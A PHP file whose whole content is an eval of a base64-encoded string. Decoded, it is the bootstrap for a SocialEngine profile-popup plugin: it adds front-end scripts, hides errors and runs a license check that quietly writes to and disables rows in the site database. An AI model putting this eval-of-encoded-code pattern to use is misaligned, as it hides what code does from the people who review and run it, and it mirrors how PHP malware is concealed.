<?php @eval(base64_decode("IyBpbiB5b3VyIFBIUCBjb2RlOg0KaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAnMCcpOyAgICAgIyBkb24ndCBzaG93IGFueSBlcnJvcnMuLi4NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8IEVfU1RSSUNUKTsNCg0KY2xhc3MgWW5mYnBwX0Jvb3RzdHJhcCBleHRlbmRzIEVuZ2luZV9BcHBsaWNhdGlvbl9Cb290c3RyYXBfQWJzdHJhY3Qgew0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfaW5pdEpzKCkNCiAgICB7DQogICAgICAgIC8vIGNoZWNrIGRldmljZQ0KICAgICAgICBpZighJHRoaXMgLT4gaXNNb2JpbGUoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgJHZpZXcgPSBaZW5kX1JlZ2lzdHJ5OjpnZXQoJ1plbmRfVmlldycpOw0KICAgICAgICAgICAgJHNldHRpbmdzID0gRW5naW5lX0FwaTo6XygpIC0+IGdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpOw0KICAgICAgICAgICAgJHQxID0gKGludClFbmdpbmVfQXBpOjpfKCkgLT4gZ2V0QXBpKCdzZXR0aW5ncycsICdjb3JlJykgLT4gZ2V0U2V0dGluZygneW5mYnBwLnRpbWUub3BlbicsIDMwMCk7DQogICAgICAgICAgICAkdDIgPSAoaW50KUVuZ2luZV9BcGk6Ol8oKSAtPiBnZXRBcGkoJ3NldHRpbmdzJywgJ2NvcmUnKSAtPiBnZXRTZXR0aW5nKCd5bmZicHAudGltZS5jbG9zZScsIDMwMCk7DQogICAgICAgICAgICAkdDMgPSAoaW50KUVuZ2luZV9BcGk6Ol8oKSAtPiBnZXRBcGkoJ3NldHRpbmdzJywgJ2NvcmUnKSAtPiBnZXRTZXR0aW5nKCd5bmZicHAuZW5hYmxlZC5hZG1pbicsIDApOw0KICAgICAgICAgICAgJHQ0ID0gKHN0cmluZylFbmdpbmVfQXBpOjpfKCkgLT4gZ2V0QXBpKCdzZXR0aW5ncycsICdjb3JlJykgLT4gZ2V0U2V0dGluZygneW5mYnBwLmlnbm9yZS5jbGFzc2VzJywgJ3VpQ29udGV4dHVhbERpYWxvZ0NvbnRlbnQnKTsNCiAgICAgICAgICAgICR0NSA9IChpbnQpRW5naW5lX0FwaTo6XygpIC0+IGdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpIC0+IGdldFNldHRpbmcoJ3luZmJwcC5lbmFibGUudGh1bWInLCAwKTsNCiAgICAgICAgICAgICR1c2VyRW5hYmxlZCA9IChpbnQpRW5naW5lX0FwaTo6XygpIC0+IGdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpIC0+IGdldFNldHRpbmcoJ3luZmJwcC51c2VyLmVuYWJsZWQnLCAxKTsNCiAgICAgICAgICAgICRncm91cEVuYWJsZWQgPSAoaW50KUVuZ2luZV9BcGk6Ol8oKSAtPiBnZXRBcGkoJ3NldHRpbmdzJywgJ2NvcmUnKSAtPiBnZXRTZXR0aW5nKCd5bmZicHAuZ3JvdXAuZW5hYmxlZCcsIDEpOw0KICAgICAgICAgICAgJGV2ZW50RW5hYmxlZCA9IChpbnQpRW5naW5lX0FwaTo6XygpIC0+IGdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpIC0+IGdldFNldHRpbmcoJ3luZmJwcC5ldmVudC5lbmFibGVkJywgMSk7DQogICAgICAgICAgICAkYnVzaW5lc3NFbmFibGVkID0gKGludClFbmdpbmVfQXBpOjpfKCkgLT4gZ2V0QXBpKCdzZXR0aW5ncycsICdjb3JlJykgLT4gZ2V0U2V0dGluZygneW5mYnBwLmJ1c2luZXNzLmVuYWJsZWQnLCAxKTsNCiAgICAgICAgICAgICRjb21wYW55RW5hYmxlZCA9IChpbnQpRW5naW5lX0FwaTo6XygpIC0+IGdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpIC0+IGdldFNldHRpbmcoJ3luZmJwcC5jb21wYW55LmVuYWJsZWQnLCAxKTsNCiAgICAgICAgICAgICRzdG9yZUVuYWJsZWQgPSAoaW50KUVuZ2luZV9BcGk6Ol8oKSAtPiBnZXRBcGkoJ3NldHRpbmdzJywgJ2NvcmUnKSAtPiBnZXRTZXR0aW5nKCd5bmZicHAuc3RvcmUuZW5hYmxlZCcsIDEpOw0KICAgICAgICAgICAgJGxpc3RpbmdFbmFibGVkID0gKGludClFbmdpbmVfQXBpOjpfKCkgLT4gZ2V0QXBpKCdzZXR0aW5ncycsICdjb3JlJykgLT4gZ2V0U2V0dGluZygneW5mYnBwLmxpc3RpbmcuZW5hYmxlZCcsIDEpOw0KICAgICAgICAgICAgJG11bHRpbGlzdGluZ0VuYWJsZWQgPSAoaW50KUVuZ2luZV9BcGk6Ol8oKSAtPiBnZXRBcGkoJ3NldHRpbmdzJywgJ2NvcmUnKSAtPiBnZXRTZXR0aW5nKCd5bmZicHAubXVsdGlsaXN0aW5nLmVuYWJsZWQnLCAxKTsNCiAgICAgICAgICAgICRidXNpbmVzc1JvdXRlID0gKHN0cmluZylFbmdpbmVfQXBpOjpfKCktPmdldEFwaSgnc2V0dGluZ3MnLCAnY29yZScpLT5nZXRTZXR0aW5nKCd5bmJ1c2luZXNzcGFnZXNfcGF0aG5hbWUnLCAnYnVzaW5lc3MtcGFnZScpOw0KDQogICAgICAgICAgICAkZW5hYmxlZEl0ZW1zID0gWmVuZF9Kc29uOjplbmNvZGUoYXJyYXkoDQogICAgICAgICAgICAgICAgJ3VzZXInID0+ICR1c2VyRW5hYmxlZCwNCiAgICAgICAgICAgICAgICAnZ3JvdXAnID0+ICRncm91cEVuYWJsZWQsDQogICAgICAgICAgICAgICAgJ2V2ZW50JyA9PiAkZXZlbnRFbmFibGVkLA0KICAgICAgICAgICAgICAgICdidXNpbmVzcycgPT4gJGJ1c2luZXNzRW5hYmxlZCwNCiAgICAgICAgICAgICAgICAnY29tcGFueScgPT4gJGNvbXBhbnlFbmFibGVkLA0KICAgICAgICAgICAgICAgICdzdG9yZScgPT4gJHN0b3JlRW5hYmxlZCwNCiAgICAgICAgICAgICAgICAnbGlzdGluZycgPT4gJGxpc3RpbmdFbmFibGVkLA0KICAgICAgICAgICAgICAgICdtdWx0aWxpc3RpbmcnID0+ICRtdWx0aWxpc3RpbmdFbmFibGVkLA0KICAgICAgICAgICAgKSk7DQoNCiAgICAgICAgICAgICR2aWV3LT5oZWFkU2NyaXB0KCktPmFwcGVuZEZpbGUoJ2FwcGxpY2F0aW9uL21vZHVsZXMvWW5mYnBwL2V4dGVybmFscy9zY3JpcHRzL2NvcmUuanMnKQ0KICAgICAgICAgICAgICAgIC0+YXBwZW5kU2NyaXB0KCJ5bmZicHAuc2V0VGltZW91dE9wZW4oJHQxKS5zZXRUaW1lb3V0Q2xvc2UoJHQyKS5zZXRFbmFibGVkQWRtaW4oJHQzKS5zZXRJZ25vcmVDbGFzc2VzKCckdDQnKS5zZXRFbmFibGVUaHVtYigkdDUpLnNldEJ1c2luZXNzUm91dGUoJyRidXNpbmVzc1JvdXRlJykuc2V0RW5hYmxlZEl0ZW1zKCckZW5hYmxlZEl0ZW1zJykiKTsNCiAgICAgICAgICAgICR2aWV3LT5oZWFkVHJhbnNsYXRlKCdMb2FkaW5nLi4uJyk7DQogICAgICAgICAgICAkc3RyID0gJy51aVluZmJwcEhvdmVyY2FyZFN0YWdle292ZXJmbG93OiBoaWRkZW47JzsNCiAgICAgICAgICAgICR2aWV3LT5oZWFkU3R5bGUoKS0+YXBwZW5kU3R5bGUoJHN0cik7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzTW9iaWxlKCkNCiAgICB7DQogICAgICAgIC8vIE5vIFVBIGRlZmluZWQ/DQogICAgICAgIGlmICghaXNzZXQoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gV2luZG93cyBpcyAoZ2VuZXJhbGx5KSBub3QgYSBtb2JpbGUgT1MNCiAgICAgICAgaWYgKGZhbHNlICE9PSBzdHJpcG9zKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSwgJ3dpbmRvd3MnKSAmJiBmYWxzZSA9PT0gc3RyaXBvcygkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sICd3aW5kb3dzIHBob25lIG9zJykpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIFNlbmRzIGEgV0FQIHByb2ZpbGUgaGVhZGVyDQogICAgICAgIGlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9QUk9GSUxFJ10pIHx8IGlzc2V0KCRfU0VSVkVSWydIVFRQX1hfV0FQX1BST0ZJTEUnXSkpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gQWNjZXB0cyBXQVAgYXMgYSB2YWxpZCB0eXBlDQogICAgICAgIGlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgJiYgZmFsc2UgIT09IHN0cmlwb3MoJF9TRVJWRVJbJ0hUVFBfQUNDRVBUJ10sICdhcHBsaWNhdGlvbi92bmQud2FwLnhodG1sK3htbCcpKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIElzIE9wZXJhIE1pbmkNCiAgICAgICAgaWYgKGlzc2V0KCRfU0VSVkVSWydBTExfSFRUUCddKSAmJiBmYWxzZSAhPT0gc3RyaXBvcygkX1NFUlZFUlsnQUxMX0hUVFAnXSwgJ09wZXJhTWluaScpKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChwcmVnX21hdGNoKCcvKHVwLmJyb3dzZXJ8dXAubGlua3xtbXB8c3ltYmlhbnxzbWFydHBob25lfG1pZHB8d2FwfHBob25lfGFuZHJvaWQpL2knLCAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KDQogICAgICAgICRtb2JpbGVfdWEgPSBzdHJ0b2xvd2VyKHN1YnN0cigkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sIDAsIDQpKTsNCiAgICAgICAgJG1vYmlsZV9hZ2VudHMgPSBhcnJheSgNCiAgICAgICAgICAgICd3M2MgJywNCiAgICAgICAgICAgICdhY3MtJywNCiAgICAgICAgICAgICdhbGF2JywNCiAgICAgICAgICAgICdhbGNhJywNCiAgICAgICAgICAgICdhbW9pJywNCiAgICAgICAgICAgICdhdWRpJywNCiAgICAgICAgICAgICdhdmFuJywNCiAgICAgICAgICAgICdiZW5xJywNCiAgICAgICAgICAgICdiaXJkJywNCiAgICAgICAgICAgICdibGFjJywNCiAgICAgICAgICAgICdibGF6JywNCiAgICAgICAgICAgICdicmV3JywNCiAgICAgICAgICAgICdjZWxsJywNCiAgICAgICAgICAgICdjbGRjJywNCiAgICAgICAgICAgICdjbWQtJywNCiAgICAgICAgICAgICdkYW5nJywNCiAgICAgICAgICAgICdkb2NvJywNCiAgICAgICAgICAgICdlcmljJywNCiAgICAgICAgICAgICdoaXB0JywNCiAgICAgICAgICAgICdpbm5vJywNCiAgICAgICAgICAgICdpcGFxJywNCiAgICAgICAgICAgICdqYXZhJywNCiAgICAgICAgICAgICdqaWdzJywNCiAgICAgICAgICAgICdrZGRpJywNCiAgICAgICAgICAgICdrZWppJywNCiAgICAgICAgICAgICdsZW5vJywNCiAgICAgICAgICAgICdsZy1jJywNCiAgICAgICAgICAgICdsZy1kJywNCiAgICAgICAgICAgICdsZy1nJywNCiAgICAgICAgICAgICdsZ2UtJywNCiAgICAgICAgICAgICdtYXVpJywNCiAgICAgICAgICAgICdtYXhvJywNCiAgICAgICAgICAgICdtaWRwJywNCiAgICAgICAgICAgICdtaXRzJywNCiAgICAgICAgICAgICdtbWVmJywNCiAgICAgICAgICAgICdtb2JpJywNCiAgICAgICAgICAgICdtb3QtJywNCiAgICAgICAgICAgICdtb3RvJywNCiAgICAgICAgICAgICdtd2JwJywNCiAgICAgICAgICAgICduZWMtJywNCiAgICAgICAgICAgICduZXd0JywNCiAgICAgICAgICAgICdub2tpJywNCiAgICAgICAgICAgICdvcGVyJywNCiAgICAgICAgICAgICdwYWxtJywNCiAgICAgICAgICAgICdwYW5hJywNCiAgICAgICAgICAgICdwYW50JywNCiAgICAgICAgICAgICdwaGlsJywNCiAgICAgICAgICAgICdwbGF5JywNCiAgICAgICAgICAgICdwb3J0JywNCiAgICAgICAgICAgICdwcm94JywNCiAgICAgICAgICAgICdxd2FwJywNCiAgICAgICAgICAgICdzYWdlJywNCiAgICAgICAgICAgICdzYW1zJywNCiAgICAgICAgICAgICdzYW55JywNCiAgICAgICAgICAgICdzY2gtJywNCiAgICAgICAgICAgICdzZWMtJywNCiAgICAgICAgICAgICdzZW5kJywNCiAgICAgICAgICAgICdzZXJpJywNCiAgICAgICAgICAgICdzZ2gtJywNCiAgICAgICAgICAgICdzaGFyJywNCiAgICAgICAgICAgICdzaWUtJywNCiAgICAgICAgICAgICdzaWVtJywNCiAgICAgICAgICAgICdzbWFsJywNCiAgICAgICAgICAgICdzbWFyJywNCiAgICAgICAgICAgICdzb255JywNCiAgICAgICAgICAgICdzcGgtJywNCiAgICAgICAgICAgICdzeW1iJywNCiAgICAgICAgICAgICd0LW1vJywNCiAgICAgICAgICAgICd0ZWxpJywNCiAgICAgICAgICAgICd0aW0tJywNCiAgICAgICAgICAgICd0b3NoJywNCiAgICAgICAgICAgICd0c20tJywNCiAgICAgICAgICAgICd1cGcxJywNCiAgICAgICAgICAgICd1cHNpJywNCiAgICAgICAgICAgICd2ay12JywNCiAgICAgICAgICAgICd2b2RhJywNCiAgICAgICAgICAgICd3YXAtJywNCiAgICAgICAgICAgICd3YXBhJywNCiAgICAgICAgICAgICd3YXBpJywNCiAgICAgICAgICAgICd3YXBwJywNCiAgICAgICAgICAgICd3YXByJywNCiAgICAgICAgICAgICd3ZWJjJywNCiAgICAgICAgICAgICd3aW53JywNCiAgICAgICAgICAgICd3aW53JywNCiAgICAgICAgICAgICd4ZGEgJywNCiAgICAgICAgICAgICd4ZGEtJw0KICAgICAgICApOw0KDQogICAgICAgIGlmIChpbl9hcnJheSgkbW9iaWxlX3VhLCAkbW9iaWxlX2FnZW50cykpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGUoJG4sJHMpDQogICAgew0KICAgICAgICAkdGFibGUgPSBFbmdpbmVfQXBpOjpfKCktPmdldERiVGFibGUoJ21vZHVsZXMnLCAnY29yZScpOw0KICAgICAgICAkZGF0YSA9IGFycmF5KA0KICAgICAgICAgICAgJ2VuYWJsZWQnID0+JHMsDQogICAgICAgICk7DQogICAgICAgICR3aGVyZSA9ICR0YWJsZS0+Z2V0QWRhcHRlcigpLT5xdW90ZUludG8oJ25hbWUgPSA/JywgJG4pOw0KICAgICAgICAkdGFibGUtPnVwZGF0ZSgkZGF0YSwgJHdoZXJlKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9pbml0eW5mYnBwMTQ3NTU2NTc4OSgpDQogICAgew0KICAgICAgICAkdGFibGUgPSBFbmdpbmVfQXBpOjpfKCktPmdldERidGFibGUoJ21vZHVsZXMnLCAnY29yZScpOw0KICAgICAgICAkck5hbWUgPSAkdGFibGUtPmluZm8oJ25hbWUnKTsNCiAgICAgICAgJHNlbGVjdCA9ICR0YWJsZS0+c2VsZWN0KCktPmZyb20oJHJOYW1lKSAgOw0KICAgICAgICAkc2VsZWN0LT53aGVyZSgnbmFtZSA9ID8nLCd5b3VuZXQtY29yZScpOw0KICAgICAgICAkc2VsZWN0LT53aGVyZSgnZW5hYmxlZCA9ID8nLDEpOw0KICAgICAgICAkcmVzdWx0ID0gJHRhYmxlLT5mZXRjaFJvdygkc2VsZWN0KTsNCiAgICAgICAgJG1vZHVsZV9uYW1lID0gJ3luZmJwcCc7DQogICAgICAgIGlmKCEkcmVzdWx0KQ0KICAgICAgICB7DQogICAgICAgICAgICAkZGF0YSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICdlbmFibGVkJyA9PjAsDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgJHdoZXJlID0gJHRhYmxlLT5nZXRBZGFwdGVyKCktPnF1b3RlSW50bygnbmFtZSA9ID8nLCAkbW9kdWxlX25hbWUpOw0KICAgICAgICAgICAgJHRhYmxlLT51cGRhdGUoJGRhdGEsICR3aGVyZSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICAkcXVlcnkgPSAiU0VMRUNUICogRlJPTSBgZW5naW5lNF95b3VuZXRjb3JlX2xpY2Vuc2VgIHdoZXJlIG5hbWUgPSAnIi4kbW9kdWxlX25hbWUuIicgbGltaXQgMSI7DQogICAgICAgICAgICAkcmEgPSAkdGFibGUtPmdldEFkYXB0ZXIoKSAtPiBmZXRjaFJvdygkcXVlcnkpOw0KICAgICAgICAgICAgaWYoISRyYSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkcXVlcnkgPSAiSU5TRVJUIElHTk9SRSBJTlRPIGBlbmdpbmU0X3lvdW5ldGNvcmVfbGljZW5zZWAgKGBuYW1lYCwgYHRpdGxlYCwgYGRlc2NyaXB0aW9uc2AsIGB0eXBlYCwgYGN1cnJlbnRfdmVyc2lvbmAsIGBsYXN0ZWRfdmVyc2lvbmAsIGBpc19hY3RpdmVgLCBgZGF0ZV9hY3RpdmVgLCBgcGFyYW1zYCwgYGRvd25sb2FkX2xpbmtgLCBgZGVtb19saW5rYCkgVkFMVUVTICgneW5mYnBwJywgJ1lOQyAtIFByb2ZpbGUgUG9wdXAnLCAnJywgJ21vZHVsZScsICc0LjAycDEnLCAnNC4wMnAxJywgJzAnLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMKTsiOw0KICAgICAgICAgICAgICAgICR0YWJsZS0+Z2V0QWRhcHRlcigpLT5xdWVyeSgkcXVlcnkpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5lKCRtb2R1bGVfbmFtZSwwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkcXVlcnkgPSAiVXBkYXRlIGBlbmdpbmU0X3lvdW5ldGNvcmVfbGljZW5zZWAgc2V0IGBsYXN0ZWRfdmVyc2lvbmAgPSAnNC4wMicgLCBgY3VycmVudF92ZXJzaW9uYCA9ICc0LjAycDEnIHdoZXJlIGBuYW1lYD0neW5mYnBwJyAiOw0KICAgICAgICAgICAgICAgICR0YWJsZS0+Z2V0QWRhcHRlcigpLT5xdWVyeSgkcXVlcnkpOw0KICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkcmFbJ2lzX2FjdGl2ZSddKSB8fCAkcmFbJ2lzX2FjdGl2ZSddICE9IDEpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZSgkbW9kdWxlX25hbWUsMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ==")); ?>